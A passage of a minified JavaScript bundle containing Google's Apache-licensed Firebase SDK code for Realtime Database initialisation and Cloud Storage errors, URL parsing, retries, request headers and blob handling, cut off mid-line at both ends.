instanceof Mh?this.eventType===e.eventType&&(!this.callbackContext||!e.callbackContext||this.callbackContext.matches(e.callbackContext)):!1}hasAnyCallback(){return!!this.callbackContext}}function $N(t,e,n,r,i){let s;if(typeof r=="object"&&(s=void 0,i=r),typeof r=="function"&&(s=r),i&&i.onlyOnce){const a=n,u=(c,d)=>{fm(t._repo,t,l),a(c,d)};u.userCallback=n.userCallback,u.context=n.context,n=u}const o=new WN(n,s||void 0),l=e==="value"?new Dh(o):new Mh(e,o);return DN(t._repo,t,l),()=>fm(t._repo,t,l)}function VN(t,e,n,r){return $N(t,"value",e,n,r)}G1(Xt);Z1(Xt);/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const qN="FIREBASE_DATABASE_EMULATOR_HOST",Mc={};let GN=!1;function KN(t,e,n,r){t.repoInfo_=new ly(`${e}:${n}`,!1,t.repoInfo_.namespace,t.repoInfo_.webSocketOnly,t.repoInfo_.nodeAdmin,t.repoInfo_.persistenceKey,t.repoInfo_.includeNamespaceInQueryParams,!0),r&&(t.authTokenProvider_=r)}function YN(t,e,n,r,i){let s=r||t.options.databaseURL;s===void 0&&(t.options.projectId||qt("Can't determine Firebase Database URL. Be sure to include  a Project ID when calling firebase.initializeApp()."),Pe("Using default host for project ",t.options.projectId),s=`${t.options.projectId}-default-rtdb.firebaseio.com`);let o=pm(s,i),l=o.repoInfo,a,u;typeof process<"u"&&process.env&&(u=process.env[qN]),u?(a=!0,s=`http://${u}?ns=${l.namespace}`,o=pm(s,i),l=o.repoInfo):a=!o.repoInfo.secure;const c=i&&a?new Yr(Yr.OWNER):new dR(t.name,t.options,e);TN("Invalid Firebase Database URL",o),j(o.path)||qt("Database URL must point to the root of a Firebase Database (not including a child path).");const d=XN(l,t,c,new cR(t.name,n));return new JN(d,t)}function QN(t,e){const n=Mc[e];(!n||n[t.key]!==t)&&qt(`Database ${e}(${t.repoInfo_}) has already been deleted.`),MN(t),delete n[t.key]}function XN(t,e,n,r){let i=Mc[e.name];i||(i={},Mc[e.name]=i);let s=i[t.toURLString()];return s&&qt("Database initialized multiple times. Please make sure the format of the database URL matches with each database() call."),s=new PN(t,GN,n,r),i[t.toURLString()]=s,s}class JN{constructor(e,n){this._repoInternal=e,this.app=n,this.type="database",this._instanceStarted=!1}get _repo(){return this._instanceStarted||(xN(this._repoInternal,this.app.options.appId,this.app.options.databaseAuthVariableOverride),this._instanceStarted=!0),this._repoInternal}get _root(){return this._rootInternal||(this._rootInternal=new Xt(this._repo,H())),this._rootInternal}_delete(){return this._rootInternal!==null&&(QN(this._repo,this.app.name),this._repoInternal=null,this._rootInternal=null),Promise.resolve()}_checkNotDeleted(e){this._rootInternal===null&&qt("Cannot call "+e+" on a deleted database.")}}function ZN(t=qd(),e){const n=ha(t,"database").getImmediate({identifier:e});if(!n._instanceStarted){const r=nv("database");r&&eP(n,...r)}return n}function eP(t,e,n,r={}){t=Ie(t),t._checkNotDeleted("useEmulator"),t._instanceStarted&&qt("Cannot call useEmulator() after instance has already been initialized.");const i=t._repoInternal;let s;if(i.repoInfo_.nodeAdmin)r.mockUserToken&&qt('mockUserToken is not supported by the Admin SDK. For client access with mock users, please use the "firebase" package instead of "firebase-admin".'),s=new Yr(Yr.OWNER);else if(r.mockUserToken){const o=typeof r.mockUserToken=="string"?r.mockUserToken:sv(r.mockUserToken,t.app.options.projectId);s=new Yr(o)}KN(i,e,n,s)}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function tP(t){Yk(gr),sr(new Rn("database",(e,{instanceIdentifier:n})=>{const r=e.getProvider("app").getImmediate(),i=e.getProvider("auth-internal"),s=e.getProvider("app-check-internal");return YN(r,i,s,n)},"PUBLIC").setMultipleInstances(!0)),Rt(Lp,Dp,t),Rt(Lp,Dp,"esm2017")}jt.prototype.simpleListen=function(t,e){this.sendRequest("q",{p:t},e)};jt.prototype.echo=function(t,e){this.sendRequest("echo",{d:t},e)};tP();/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const aw="firebasestorage.googleapis.com",uw="storageBucket",nP=2*60*1e3,rP=10*60*1e3,iP=1e3;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class se extends Yt{constructor(e,n,r=0){super(_u(e),`Firebase Storage: ${n} (${_u(e)})`),this.status_=r,this.customData={serverResponse:null},this._baseMessage=this.message,Object.setPrototypeOf(this,se.prototype)}get status(){return this.status_}set status(e){this.status_=e}_codeEquals(e){return _u(e)===this.code}get serverResponse(){return this.customData.serverResponse}set serverResponse(e){this.customData.serverResponse=e,this.customData.serverResponse?this.message=`${this._baseMessage}
${this.customData.serverResponse}`:this.message=this._baseMessage}}var J;(function(t){t.UNKNOWN="unknown",t.OBJECT_NOT_FOUND="object-not-found",t.BUCKET_NOT_FOUND="bucket-not-found",t.PROJECT_NOT_FOUND="project-not-found",t.QUOTA_EXCEEDED="quota-exceeded",t.UNAUTHENTICATED="unauthenticated",t.UNAUTHORIZED="unauthorized",t.UNAUTHORIZED_APP="unauthorized-app",t.RETRY_LIMIT_EXCEEDED="retry-limit-exceeded",t.INVALID_CHECKSUM="invalid-checksum",t.CANCELED="canceled",t.INVALID_EVENT_NAME="invalid-event-name",t.INVALID_URL="invalid-url",t.INVALID_DEFAULT_BUCKET="invalid-default-bucket",t.NO_DEFAULT_BUCKET="no-default-bucket",t.CANNOT_SLICE_BLOB="cannot-slice-blob",t.SERVER_FILE_WRONG_SIZE="server-file-wrong-size",t.NO_DOWNLOAD_URL="no-download-url",t.INVALID_ARGUMENT="invalid-argument",t.INVALID_ARGUMENT_COUNT="invalid-argument-count",t.APP_DELETED="app-deleted",t.INVALID_ROOT_OPERATION="invalid-root-operation",t.INVALID_FORMAT="invalid-format",t.INTERNAL_ERROR="internal-error",t.UNSUPPORTED_ENVIRONMENT="unsupported-environment"})(J||(J={}));function _u(t){return"storage/"+t}function Uh(){const t="An unknown error occurred, please check the error payload for server response.";return new se(J.UNKNOWN,t)}function sP(t){return new se(J.OBJECT_NOT_FOUND,"Object '"+t+"' does not exist.")}function oP(t){return new se(J.QUOTA_EXCEEDED,"Quota for bucket '"+t+"' exceeded, please view quota on https://firebase.google.com/pricing/.")}function lP(){const t="User is not authenticated, please authenticate using Firebase Authentication and try again.";return new se(J.UNAUTHENTICATED,t)}function aP(){return new se(J.UNAUTHORIZED_APP,"This app does not have permission to access Firebase Storage on this project.")}function uP(t){return new se(J.UNAUTHORIZED,"User does not have permission to access '"+t+"'.")}function cw(){return new se(J.RETRY_LIMIT_EXCEEDED,"Max retry time for operation exceeded, please try again.")}function dw(){return new se(J.CANCELED,"User canceled the upload/download.")}function cP(t){return new se(J.INVALID_URL,"Invalid URL '"+t+"'.")}function dP(t){return new se(J.INVALID_DEFAULT_BUCKET,"Invalid default bucket '"+t+"'.")}function hP(){return new se(J.NO_DEFAULT_BUCKET,"No default bucket found. Did you set the '"+uw+"' property when initializing the app?")}function hw(){return new se(J.CANNOT_SLICE_BLOB,"Cannot slice blob for upload. Please retry the upload.")}function fP(){return new se(J.SERVER_FILE_WRONG_SIZE,"Server recorded incorrect upload file size, please retry the upload.")}function pP(){return new se(J.NO_DOWNLOAD_URL,"The given file does not have any download URLs.")}function mP(t){return new se(J.UNSUPPORTED_ENVIRONMENT,`${t} is missing. Make sure to install the required polyfills. See https://firebase.google.com/docs/web/environments-js-sdk#polyfills for more information.`)}function Uc(t){return new se(J.INVALID_ARGUMENT,t)}function fw(){return new se(J.APP_DELETED,"The Firebase app was deleted.")}function gP(t){return new se(J.INVALID_ROOT_OPERATION,"The operation '"+t+"' cannot be performed on a root reference, create a non-root reference using child, such as .child('file.png').")}function os(t,e){return new se(J.INVALID_FORMAT,"String does not match format '"+t+"': "+e)}function Ui(t){throw new se(J.INTERNAL_ERROR,"Internal error: "+t)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Qe{constructor(e,n){this.bucket=e,this.path_=n}get path(){return this.path_}get isRoot(){return this.path.length===0}fullServerUrl(){const e=encodeURIComponent;return"/b/"+e(this.bucket)+"/o/"+e(this.path)}bucketOnlyServerUrl(){return"/b/"+encodeURIComponent(this.bucket)+"/o"}static makeFromBucketSpec(e,n){let r;try{r=Qe.makeFromUrl(e,n)}catch{return new Qe(e,"")}if(r.path==="")return r;throw dP(e)}static makeFromUrl(e,n){let r=null;const i="([A-Za-z0-9.\\-_]+)";function s(y){y.path.charAt(y.path.length-1)==="/"&&(y.path_=y.path_.slice(0,-1))}const o="(/(.*))?$",l=new RegExp("^gs://"+i+o,"i"),a={bucket:1,path:3};function u(y){y.path_=decodeURIComponent(y.path)}const c="v[A-Za-z0-9_]+",d=n.replace(/[.]/g,"\\."),h="(/([^?#]*).*)?$",m=new RegExp(`^https?://${d}/${c}/b/${i}/o${h}`,"i"),_={bucket:1,path:3},v=n===aw?"(?:storage.googleapis.com|storage.cloud.google.com)":n,w="([^?#]*)",p=new RegExp(`^https?://${v}/${i}/${w}`,"i"),g=[{regex:l,indices:a,postModify:s},{regex:m,indices:_,postModify:u},{regex:p,indices:{bucket:1,path:2},postModify:u}];for(let y=0;y<g.length;y++){const T=g[y],k=T.regex.exec(e);if(k){const N=k[T.indices.bucket];let x=k[T.indices.path];x||(x=""),r=new Qe(N,x),T.postModify(r);break}}if(r==null)throw cP(e);return r}}class _P{constructor(e){this.promise_=Promise.reject(e)}getPromise(){return this.promise_}cancel(e=!1){}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function vP(t,e,n){let r=1,i=null,s=null,o=!1,l=0;function a(){return l===2}let u=!1;function c(...w){u||(u=!0,e.apply(null,w))}function d(w){i=setTimeout(()=>{i=null,t(m,a())},w)}function h(){s&&clearTimeout(s)}function m(w,...p){if(u){h();return}if(w){h(),c.call(null,w,...p);return}if(a()||o){h(),c.call(null,w,...p);return}r<64&&(r*=2);let g;l===1?(l=2,g=0):g=(r+Math.random())*1e3,d(g)}let _=!1;function v(w){_||(_=!0,h(),!u&&(i!==null?(w||(l=2),clearTimeout(i),d(0)):w||(l=1)))}return d(0),s=setTimeout(()=>{o=!0,v(!0)},n),v}function yP(t){t(!1)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function wP(t){return t!==void 0}function EP(t){return typeof t=="function"}function CP(t){return typeof t=="object"&&!Array.isArray(t)}function Ta(t){return typeof t=="string"||t instanceof String}function mm(t){return Fh()&&t instanceof Blob}function Fh(){return typeof Blob<"u"&&!mS()}function gm(t,e,n,r){if(r<e)throw Uc(`Invalid value for '${t}'. Expected ${e} or greater.`);if(r>n)throw Uc(`Invalid value for '${t}'. Expected ${n} or less.`)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function no(t,e,n){let r=e;return n==null&&(r=`https://${e}`),`${n}://${r}/v0${t}`}function pw(t){const e=encodeURIComponent;let n="?";for(const r in t)if(t.hasOwnProperty(r)){const i=e(r)+"="+e(t[r]);n=n+i+"&"}return n=n.slice(0,-1),n}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */var Xn;(function(t){t[t.NO_ERROR=0]="NO_ERROR",t[t.NETWORK_ERROR=1]="NETWORK_ERROR",t[t.ABORT=2]="ABORT"})(Xn||(Xn={}));/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function mw(t,e){const n=t>=500&&t<600,i=[408,429].indexOf(t)!==-1,s=e.indexOf(t)!==-1;return n||i||s}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class SP{constructor(e,n,r,i,s,o,l,a,u,c,d,h=!0){this.url_=e,this.method_=n,this.headers_=r,this.body_=i,this.successCodes_=s,this.additionalRetryCodes_=o,this.callback_=l,this.errorCallback_=a,this.timeout_=u,this.progressCallback_=c,this.connectionFactory_=d,this.retry=h,this.pendingConnection_=null,this.backoffId_=null,this.canceled_=!1,this.appDelete_=!1,this.promise_=new Promise((m,_)=>{this.resolve_=m,this.reject_=_,this.start_()})}start_(){const e=(r,i)=>{if(i){r(!1,new Ro(!1,null,!0));return}const s=this.connectionFactory_();this.pendingConnection_=s;const o=l=>{const a=l.loaded,u=l.lengthComputable?l.total:-1;this.progressCallback_!==null&&this.progressCallback_(a,u)};this.progressCallback_!==null&&s.addUploadProgressListener(o),s.send(this.url_,this.method_,this.body_,this.headers_).then(()=>{this.progressCallback_!==null&&s.removeUploadProgressListener(o),this.pendingConnection_=null;const l=s.getErrorCode()===Xn.NO_ERROR,a=s.getStatus();if(!l||mw(a,this.additionalRetryCodes_)&&this.retry){const c=s.getErrorCode()===Xn.ABORT;r(!1,new Ro(!1,null,c));return}const u=this.successCodes_.indexOf(a)!==-1;r(!0,new Ro(u,s))})},n=(r,i)=>{const s=this.resolve_,o=this.reject_,l=i.connection;if(i.wasSuccessCode)try{const a=this.callback_(l,l.getResponse());wP(a)?s(a):s()}catch(a){o(a)}else if(l!==null){const a=Uh();a.serverResponse=l.getErrorText(),this.errorCallback_?o(this.errorCallback_(l,a)):o(a)}else if(i.canceled){const a=this.appDelete_?fw():dw();o(a)}else{const a=cw();o(a)}};this.canceled_?n(!1,new Ro(!1,null,!0)):this.backoffId_=vP(e,n,this.timeout_)}getPromise(){return this.promise_}cancel(e){this.canceled_=!0,this.appDelete_=e||!1,this.backoffId_!==null&&yP(this.backoffId_),this.pendingConnection_!==null&&this.pendingConnection_.abort()}}class Ro{constructor(e,n,r){this.wasSuccessCode=e,this.connection=n,this.canceled=!!r}}function TP(t,e){e!==null&&e.length>0&&(t.Authorization="Firebase "+e)}function IP(t,e){t["X-Firebase-Storage-Version"]="webjs/"+(e??"AppManager")}function kP(t,e){e&&(t["X-Firebase-GMPID"]=e)}function RP(t,e){e!==null&&(t["X-Firebase-AppCheck"]=e)}function NP(t,e,n,r,i,s,o=!0){const l=pw(t.urlParams),a=t.url+l,u=Object.assign({},t.headers);return kP(u,e),TP(u,n),IP(u,s),RP(u,r),new SP(a,t.method,u,t.body,t.successCodes,t.additionalRetryCodes,t.handler,t.errorHandler,t.timeout,t.progressCallback,i,o)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function PP(){return typeof BlobBuilder<"u"?BlobBuilder:typeof WebKitBlobBuilder<"u"?WebKitBlobBuilder:void 0}function xP(...t){const e=PP();if(e!==void 0){const n=new e;for(let r=0;r<t.length;r++)n.append(t[r]);return n.getBlob()}else{if(Fh())return new Blob(t);throw new se(J.UNSUPPORTED_ENVIRONMENT,"This browser doesn't seem to support creating Blobs")}}function AP(t,e,n){return t.webkitSlice?t.webkitSlice(e,n):t.mozSlice?t.mozSlice(e,n):t.slice?t.slice(e,n):null}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function OP(t){if(typeof atob>"u")throw mP("base-64");return atob(t)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Tt={RAW:"raw",BASE64:"base64",BASE64URL:"base64url",DATA_URL:"data_url"};class vu{constructor(e,n){this.data=e,this.contentType=n||null}}function bP(t,e){switch(t){case Tt.RAW:return new vu(gw(e));case Tt.BASE64:case Tt.BASE64URL:return new vu(_w(t,e));case Tt.DATA_URL:return new vu(DP(e),MP(e))}throw Uh()}function gw(t){const e=[];for(let n=0;n<t.length;n++){let r=t.charCodeAt(n);if(r<=127)e.push(r);else if(r<=2047)e.push(192|r>>6,128|r&63);else if((r&64512)===55296)if(!(n<t.length-1&&(t.charCodeAt(n+1)&64512)===56320))e.push(239,191,189);else{const s=r,o=t.charCodeAt(++n);r=65536|(s&1023)<<10|o&1023,e.push(240|r>>18,128|r>>12&63,128|r>>6&63,128|r&63)}else(r&64512)===56320?e.push(239,191,189):e.push(224|r>>12,128|r>>6&63,128|r&63)}return new Uint8Array(e)}function LP(t){let e;try{e=decodeURIComponent(t)}catch{throw os(Tt.DATA_URL,"Malformed data URL.")}return gw(e)}function _w(t,e){switch(t){case Tt.BASE64:{const i=e.indexOf("-")!==-1,s=e.indexOf("_")!==-1;if(i||s)throw os(t,"Invalid character '"+(i?"-":"_")+"' found: is it base64url encoded?");break}case Tt.BASE64URL:{const i=e.indexOf("+")!==-1,s=e.indexOf("/")!==-1;if(i||s)throw os(t,"Invalid character '"+(i?"+":"/")+"' found: is it base64 encoded?");e=e.replace(/-/g,"+").replace(/_/g,"/");break}}let n;try{n=OP(e)}catch(i){throw i.message.includes("polyfill")?i:os(t,"Invalid character found")}const r=new Uint8Array(n.length);for(let i=0;i<n.length;i++)r[i]=n.charCodeAt(i);return r}class vw{constructor(e){this.base64=!1,this.contentType=null;const n=e.match(/^data:([^,]+)?,/);if(n===null)throw os(Tt.DATA_URL,"Must be formatted 'data:[<mediatype>][;base64],<data>");const r=n[1]||null;r!=null&&(this.base64=UP(r,";base64"),this.contentType=this.base64?r.substring(0,r.length-7):r),this.rest=e.substring(e.indexOf(",")+1)}}function DP(t){const e=new vw(t);return e.base64?_w(Tt.BASE64,e.rest):LP(e.rest)}function MP(t){return new vw(t).contentType}function UP(t,e){return t.length>=e.length?t.substring(t.length-e.length)===e:!1}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class un{constructor(e,n){let r=0,i="";mm(e)?(this.data_=e,r=e.size,i=e.type):e instanceof ArrayBuffer?(n?this.data_=new Uint8Array(e):(this.data_=new Uint8Array(e.byteLength),this.data_.set(new Uint8Array(e))),r=this.data_.length):e instanceof Uint8Array&&(n?this.data_=e:(this.data_=new Uint8Array(e.length),this.data_.set(e)),r=e.length),this.size_=r,this.type_=i}size(){return this.size_}type(){return this.type_}slice(e,n){if(mm(this.data_)){const r=this.data_,i=AP(r,e,n);return i===null?null:new un(i)}else{const r=new Uint8Array(this.data_.buffer,e,n-e);return new un(r,!0)}}static getBlob(...e){if(Fh()){const n=e.map(r=>r instanceof un?r.data_:r);return new un(xP.apply(null,n))}else{const n=e.map(o=>Ta(o)?bP(Tt.RAW,o).data:o.data_);let r=0;n.forEach(o=>{r+=o.byteLength});const i=new Uint8Array(r);let s=0;return n.forEach(o=>{for(let l=0;l<o.length;l++)i[s++]=o[l]}),new un(i,!0)}}uploadData(){return this.data_}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function yw(t){let e;try{e=JSON.parse(t)}catch{return null}return CP(e)?e:null}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function FP(t){if(t.length===0)return null;const e=t.lastIndexOf("/");return e===-1?"":t.slice(0,e)}function jP(t,e){const n=e.split("/").filter(r=>r.length>0).join("/");return t.length===0?n:t+"/"+n}function ww(t){const e=t.lastIndexOf("/",t.length-2);return e===-1?t:t.slice(e+1)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function zP(t,e){return e}class Oe{constructor(e,n,r,i){this.server=e,this.local=n||e,this.writable=!!r,this.xform=i||zP}}let No=null;function BP(t){return!Ta(t)||t.length<2?t:ww(t)}function Ew(){if(No)return No;const t=[];t.push(new Oe("bucket")),t.push(new Oe("generation")),t.push(new Oe("metageneration")),t.push(new Oe("name","fullPath",!0));function e(s,o){return BP(o)}const n=new Oe("name");n.xform=e,t.push(n);function r(s,o){return o!==void 0?Number(o):o}const i=new Oe("size");return i.xform=r,t.push(i),t.push(new Oe("timeCreated")),t.push(new Oe("updated")),t.push(new Oe("md5Hash",null,!0)),t.push(new Oe("cacheControl",null,!0)),t.push(new Oe("contentDisposition",null,!0)),t.push(new Oe("contentEncoding",null,!0)),t.push(new Oe("contentLanguage",null,!0)),t.push(new Oe("contentType",null,!0)),t.push(new Oe("metadata","customMetadata",!0)),No=t,No}function HP(t,e){function n(){const r=t.bucket,i=t.fullPath,s=new Qe(r,i);return e._makeStorageReference(s)}Object.defineProperty(t,"ref",{get:n})}function WP(t,e,n){const r={};r.type="file";const i=n.length;for(let s=0;s<i;s++){const o=n[s];r[o.local]=o.xform(r,e[o.server])}return HP(r,t),r}function Cw(t,e,n){const r=yw(e);return r===null?null:WP(t,r,n)}function $P(t,e,n,r){const i=yw(e);if(i===null||!Ta(i.downloadTokens))return null;const s=i.downloadTokens;if(s.length===0)return null;const o=encodeURIComponent;return s.split(",").map(u=>{const c=t.bucket,d=t.fullPath,h="/b/"+o(c)+"/o/"+o(d),m=no(h,n,r),_=pw({alt:"media",token:u});return m+_})[0]}function Sw(t,e){const n={},r=e.length;for(let i=0;i<r;i++){const s=e[i];s.writable&&(n[s.server]=t[s.local])}return JSON.stringify(n)}class Ci{constructor(e,n,r,i){this.url=e,this.method=n,this.handler=r,this.timeout=i,this.urlParams={},this.headers={},this.body=null,this.errorHandler=null,this.progressCallback=null,this.successCodes=[200],this.additionalRetryCodes=[]}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function zt(t){if(!t)throw Uh()}function jh(t,e){function n(r,i){const s=Cw(t,i,e);return zt(s!==null),s}return n}function VP(t,e){function n(r,i){const s=Cw(t,i,e);return zt(s!==null),$P(s,i,t.host,t._protocol)}return n}function ro(t){function e(n,r){let i;return n.getStatus()===401?n.getErrorText().includes("Firebase App Check token is invalid")?i=aP():i=lP():n.getStatus()===402?i=oP(t.bucket):n.getStatus()===403?i=uP(t.path):i=r,i.status=n.getStatus(),i.serverResponse=r.serverResponse,i}return e}function Tw(t){const e=ro(t);function n(r,i){let s=e(r,i);return r.getStatus()===404&&(s=sP(t.path)),s.serverResponse=i.serverResponse,s}return n}function qP(t,e,n){const r=e.fullServerUrl(),i=no(r,t.host,t._protocol),s="GET",o=t.maxOperationRetryTime,l=new Ci(i,s,jh(t,n),o);return l.errorHandler=Tw(e),l}function GP(t,e,n){const r=e.fullServerUrl(),i=no(r,t.host,t._protocol),s="GET",o=t.maxOperationRetryTime,l=new Ci(i,s,VP(t,n),o);return l.errorHandler=Tw(e),l}function KP(t,e){return t&&t.contentType||e&&e.type()||"application/octet-stream"}function Iw(t,e,n){const r=Object.assign({},n);return r.fullPath=t.path,r.size=e.size(),r.contentType||(r.contentType=KP(null,e)),r}function YP(t,e,n,r,i){const s=e.bucketOnlyServerUrl(),o={"X-Goog-Upload-Protocol":"multipart"};function l(){let g="";for(let y=0;y<2;y++)g=g+Math.random().toString().slice(2);return g}const a=l();o["Content-Type"]="multipart/related; 